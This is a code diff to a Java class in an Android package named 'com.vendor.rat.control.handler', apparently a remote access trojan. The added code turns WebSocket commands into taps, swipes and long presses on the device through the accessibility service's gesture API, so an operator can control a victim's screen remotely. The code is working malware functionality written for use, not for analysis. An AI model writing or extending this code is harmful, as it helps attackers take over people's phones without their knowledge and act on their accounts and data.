@@ -1,6 +1,8 @@
 package com.vendor.rat.control.handler;
 
 import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.GestureDescription;
+import android.graphics.Path;
 import android.util.Log;
 
 import com.google.gson.JsonObject;
@@ -210,12 +212,129 @@ public class CommandDispatcher implements WebSocketClient.CommandListener {
 
     /**
      * 触摸/滑动操作
-     * 格式: {"type":"screen", "subc":"mov", "poi":"x,y" 或 "x1,y1,x2,y2", "movetype":"click/swipe"}
+     * movetype: "0"=点击, "1"=滑动, "2"=长按
+     *
+     * 点击/长按: poi = {"x":100,"y":200} (JSON 对象)
+     * 滑动:     poi = "(x1,y1):(x2,y2)" (字符串)
      */
     private void handleMov(JsonObject payload) {
         String movetype = payload.has("movetype") ? payload.get("movetype").getAsString() : "";
-        Log.d(TAG, "mov: movetype=" + movetype + ", poi=" + payload.get("poi"));
-        // TODO: 通过 AccessibilityService.dispatchGesture() 实现触摸/滑动
+        Log.d(TAG, "mov: movetype=" + movetype);
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        if (service == null) {
+            Log.w(TAG, "mov: AccessibilityService not available");
+            return;
+        }
+
+        switch (movetype) {
+            case "0": // 点击
+                handleTap(service, payload);
+                break;
+            case "1": // 滑动
+                handleSwipe(service, payload);
+                break;
+            case "2": // 长按
+                handleLongPress(service, payload);
+                break;
+            default:
+                Log.w(TAG, "mov: unknown movetype=" + movetype);
+        }
+    }
+
+    private void handleTap(AccessibilityService service, JsonObject payload) {
+        int[] coords = parsePoiObject(payload);
+        if (coords == null) return;
+
+        Path path = new Path();
+        path.moveTo(coords[0], coords[1]);
+
+        GestureDescription gesture = new GestureDescription.Builder()
+            .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
+            .build();
+
+        service.dispatchGesture(gesture, null, null);
+        Log.d(TAG, "tap: x=" + coords[0] + ", y=" + coords[1]);
+    }
+
+    private void handleSwipe(AccessibilityService service, JsonObject payload) {
+        // poi 格式: "(x1,y1):(x2,y2)" 或 "(x1,y1):(x2,y2):(x3,y3)"
+        String poi = "";
+        if (payload.has("poi")) {
+            poi = payload.get("poi").isJsonPrimitive()
+                ? payload.get("poi").getAsString()
+                : payload.get("poi").toString();
+        }
+
+        // 解析 (x,y):(x,y) 格式
+        String[] points = poi.split(":");
+        if (points.length < 2) {
+            Log.w(TAG, "swipe: invalid poi=" + poi);
+            return;
+        }
+
+        int[] start = parsePoint(points[0]);
+        int[] end = parsePoint(points[points.length - 1]);
+        if (start == null || end == null) return;
+
+        Path path = new Path();
+        path.moveTo(start[0], start[1]);
+        path.lineTo(end[0], end[1]);
+
+        GestureDescription gesture = new GestureDescription.Builder()
+            .addStroke(new GestureDescription.StrokeDescription(path, 0, 300))
+            .build();
+
+        service.dispatchGesture(gesture, null, null);
+        Log.d(TAG, "swipe: " + start[0] + "," + start[1] + " → " + end[0] + "," + end[1]);
+    }
+
+    private void handleLongPress(AccessibilityService service, JsonObject payload) {
+        int[] coords = parsePoiObject(payload);
+        if (coords == null) return;
+
+        Path path = new Path();
+        path.moveTo(coords[0], coords[1]);
+
+        GestureDescription gesture = new GestureDescription.Builder()
+            .addStroke(new GestureDescription.StrokeDescription(path, 0, 1000))
+            .build();
+
+        service.dispatchGesture(gesture, null, null);
+        Log.d(TAG, "longpress: x=" + coords[0] + ", y=" + coords[1]);
+    }
+
+    /**
+     * 解析 poi JSON 对象 {"x":100,"y":200}
+     */
+    private int[] parsePoiObject(JsonObject payload) {
+        try {
+            if (payload.has("poi") && payload.get("poi").isJsonObject()) {
+                JsonObject poi = payload.getAsJsonObject("poi");
+                int x = poi.get("x").getAsInt();
+                int y = poi.get("y").getAsInt();
+                return new int[]{x, y};
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "parsePoiObject failed", e);
+        }
+        return null;
+    }
+
+    /**
+     * 解析 "(x,y)" 格式的坐标字符串
+     */
+    private int[] parsePoint(String point) {
+        try {
+            String clean = point.replaceAll("[()]", "").trim();
+            String[] parts = clean.split(",");
+            if (parts.length >= 2) {
+                return new int[]{Integer.parseInt(parts[0].trim()), Integer.parseInt(parts[1].trim())};
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "parsePoint failed: " + point, e);
+        }
+        return null;
     }
 
     /**
